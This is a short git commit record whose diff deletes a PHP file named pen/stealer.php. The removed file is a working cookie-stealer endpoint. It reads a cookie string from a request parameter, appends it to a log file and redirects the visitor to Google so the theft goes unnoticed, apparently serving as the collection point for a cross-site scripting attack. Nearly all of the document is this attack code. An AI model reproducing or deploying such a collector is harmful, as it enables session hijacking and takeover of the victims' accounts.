875d69219c7f160ce73a7cda6e38922f729f5298
JustPowerful <hmidetocraft@gmail.com>
2020-09-14 11:39:11 +0100

    Removed a folder

--- pen/stealer.php
+++
@@ -1,9 +0,0 @@
-<?php
-$cookies = $_REQUEST["c"];
-$logfile = "cookies.txt";
-
-$opfile = fopen($logfile, "a");
-fwrite($opfile, "$cookies \n");
-fclose($opfile);
-header("Location: https://www.google.com");
-?>
